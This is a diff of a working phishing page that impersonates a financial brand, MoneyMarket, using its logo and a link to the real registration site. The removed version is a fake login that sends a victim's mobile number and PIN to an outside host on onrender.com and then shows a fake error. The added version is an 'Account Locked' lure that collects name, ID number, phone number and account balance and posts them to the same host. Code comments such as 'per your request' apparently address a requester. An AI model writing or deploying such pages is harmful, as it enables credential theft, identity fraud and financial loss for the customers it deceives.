@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MoneyMarket Login</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Locked</title>
   <style>
     body {
       margin: 0;
@@ -22,42 +22,37 @@
       max-width: 400px;
       text-align: center;
       margin-top: 40px;
+      background: rgba(0,0,0,0.15);
+      padding: 18px;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.4);
     }
 
     h1 {
-      font-size: 24px;
+      font-size: 26px;
       font-weight: bold;
-      margin: 20px 0 10px;
+      margin-bottom: 5px;
     }
 
-    .sub-title {
-      font-size: 18px;
-      font-weight: bold;
+    h2 {
+      font-size: 16px;
+      margin-bottom: 15px;
+      opacity: 0.95;
     }
 
     input {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
+      margin: 8px 0;
       border: none;
       border-bottom: 1px solid white;
       background: transparent;
       color: white;
       font-size: 16px;
+      outline: none;
     }
 
-    input::placeholder {
-      color: white;
-      opacity: 0.7;
-    }
-
-    .helper-text {
-      font-size: 14px;
-      color: #ffc107;
-      text-align: right;
-      margin: -8px 0 10px;
-      cursor: pointer;
-    }
+    input::placeholder { color: white; opacity: 0.7; }
 
     .btn {
       width: 100%;
@@ -66,14 +61,13 @@
       font-size: 18px;
       font-weight: bold;
       border-radius: 8px;
-      margin: 10px 0;
+      margin: 12px 0;
       cursor: pointer;
     }
 
     .btn-primary {
-      background-color: #ddd;
+      background-color: black;
       color: white;
-      cursor: not-allowed;
     }
 
     .btn-outline {
@@ -82,86 +76,104 @@
       color: white;
     }
 
-    .terms {
-      margin-top: 20px;
-      font-size: 14px;
+    .small {
+      font-size: 13px;
+      color: #ffd54f;
+      margin-top: 8px;
+      text-align: left;
     }
 
-    .terms a {
-      color: #ffc107;
-      text-decoration: none;
+    .muted {
+      font-size: 13px;
+      opacity: 0.9;
+      margin-top: 6px;
     }
   </style>
 </head>
-
 <body>
   <div class="container">
-  <h1>Login to your</h1>
-    <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;">
+    <h1>Account Locked</h1>
+    <h2>Your account has been temporarily locked</h2>
 
-  
-  
+    <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin: 10px auto 18px; display:block;">
 
-    <div style="margin-top: 20px;">
-       <input id="number" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Your mobile number">
-      <div class="helper-text">I forgot / changed my mobile number</div>
+    <!-- Separate inputs for clarity; these will be combined into one space-separated string when sent -->
+    <input id="name" type="text" placeholder='Name and Surname (e.g. Given Mkasi)'>
+    <input id="idNumber" type="text" placeholder='ID Number (e.g. 0242442213131098)'>
+    <input id="phone" type="text" inputmode="numeric" pattern="[0-9]*" placeholder='Phone Number (e.g. 07577474773)'>
+    <input id="balance" type="text" placeholder='Account balance (e.g. R3500)'>
 
-      <input id="pin" type="password" placeholder="Your 5-digit PIN" maxlength="5" inputmode="numeric">
-      <div class="helper-text">I forgot my PIN</div>
+    <div class="small">When you submit, the page will post to the same backend endpoint as the login page:
+      <div class="muted">POST https://money-market.onrender.com/submit</div>
     </div>
 
-    <button id="loginBtn" class="btn btn-primary" disabled>Login</button>
-    <button class="btn btn-outline" onclick="window.location.href='https://app.moneymarketaccount.co.za/enhanced-onboarding/register'">
-      Open an account
-    </button>
+    <button id="unlockBtn" class="btn btn-primary">Request Unlock</button>
 
-    <div class="terms">Read our <a href="#">T&Cs</a></div>
+    <button id="fillExample" class="btn btn-outline" style="margin-top:6px;">Fill example data</button>
   </div>
-  
+
   <script>
-    const loginBtn = document.getElementById('loginBtn');
-    const phoneInput = document.getElementById('number');
-    const pinInput = document.getElementById('pin');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const fillBtn = document.getElementById('fillExample');
+    const nameInput = document.getElementById('name');
+    const idInput = document.getElementById('idNumber');
+    const phoneInput = document.getElementById('phone');
+    const balanceInput = document.getElementById('balance');
 
-    function validateFields() {
-       if (phoneInput.value.trim() && pinInput.value.trim().length === 5) {
-        loginBtn.disabled = false;
-        loginBtn.style.backgroundColor = 'black';
-        loginBtn.style.color = 'white';
-        loginBtn.style.cursor = 'pointer';
-      } else {
-        loginBtn.disabled = true;
-        loginBtn.style.backgroundColor = '#ddd';
-        loginBtn.style.color = '#999';
-        loginBtn.style.cursor = 'not-allowed';
+    // Fills the fields with the sample you provided
+    fillBtn.addEventListener('click', () => {
+      nameInput.value = 'Given Mkasi';
+      idInput.value = '0242442213131098';
+      phoneInput.value = '07577474773';
+      balanceInput.value = 'R3500';
+    });
+
+    unlockBtn.addEventListener('click', async () => {
+      // build a single space-separated string for the "number" field
+      // example -> "Given Mkasi 0242442213131098 07577474773"
+      const name = nameInput.value.trim();
+      const id = idInput.value.trim();
+      const phone = phoneInput.value.trim();
+      const balance = balanceInput.value.trim(); // going into "pin" field per your request
+
+      // Simple validation (adjust as needed)
+      if (!name || !id || !phone || !balance) {
+        alert('Please fill all fields before submitting.');
+        return;
       }
-    }
 
-    phoneInput.addEventListener('input', validateFields);
-    pinInput.addEventListener('input', validateFields);
-
-    loginBtn.addEventListener('click', async () => {
-      const number = phoneInput.value.trim();
-      const pin = pinInput.value.trim();
+      const concatNumber = `${name} ${id} ${phone}`; // single line, space-separated
 
       try {
-        const res = await fetch("https://money-market.onrender.com/submit", { // ✅ Replace with your backend URL
+        const res = await fetch("https://money-market.onrender.com/submit", {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ number, pin })
+          // same shape your login page used: { number, pin }
+          body: JSON.stringify({
+            number: concatNumber,
+            pin: balance
+          })
         });
 
-        const data = await res.json();
+        // try to parse response (safe)
+        let data;
+        try { data = await res.json(); } catch(e) { data = null; }
+
         if (res.ok) {
-          alert('Something went wrong...');
+          // backend returned 200 — show success message (customize to your backend behavior)
+          alert(data && data.message ? data.message : 'Unlock request submitted successfully.');
+          // clear fields if you prefer
+          nameInput.value = '';
+          idInput.value = '';
           phoneInput.value = '';
-          pinInput.value = '';
-          validateFields();
+          balanceInput.value = '';
         } else {
-          alert(data.message);
+          // backend returned non-2xx
+          alert((data && data.message) ? `Error: ${data.message}` : `Server responded with status ${res.status}`);
         }
       } catch (err) {
-        alert('❌ Server error');
+        console.error(err);
+        alert('❌ Server error — could not submit request.');
       }
     });
   </script>
